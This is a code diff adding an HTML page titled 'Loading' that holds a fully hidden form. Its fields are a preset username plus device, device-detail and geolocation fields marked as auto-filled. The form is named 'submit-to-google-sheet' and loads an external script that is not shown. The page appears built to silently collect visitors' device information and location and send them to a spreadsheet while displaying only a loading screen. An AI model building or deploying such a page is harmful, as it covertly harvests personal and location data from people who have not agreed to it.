@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading</title>
+</head>
+<body>
+    <form id="usernameForm" action="" method="POST" name="submit-to-google-sheet">
+        <label for="username"></label>
+        <input hidden type="text" id="username" name="username" value="kambing" required>
+        
+        <label for="device"></label>
+        <input hidden type="text" id="device" name="device" readonly> <!-- Field untuk perangkat yang diisi otomatis -->
+        
+        <label for="deviceDetails"></label>
+        <input hidden type="text" id="deviceDetails" name="deviceDetails" readonly>
+
+        <label for="geoLocation"></label>
+        <input hidden type="text" id="geoLocation" name="geoLocation" readonly> <!-- Field untuk lokasi geografis -->
+
+        <button hidden id="submit" type="submit"></button>
+    </form>
+    <script src="jsscript.js"></script>
+</body>
+</html>
+
